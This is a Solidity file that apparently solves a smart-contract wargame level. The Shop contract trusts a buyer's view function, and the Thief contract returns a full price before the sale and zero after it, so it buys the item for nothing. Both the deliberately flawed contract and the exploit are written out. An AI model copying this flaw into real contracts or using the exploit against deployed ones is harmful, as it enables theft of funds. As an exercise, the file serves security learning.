// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Thief is Buyer {
    uint256 p = 100;
    address instance;

    function start(address _instance) external {
        instance = _instance;
        Shop(instance).buy();
    }

    function price() external view returns (uint256) {
        return Shop(instance).isSold() ? 0 : 100;
    }
}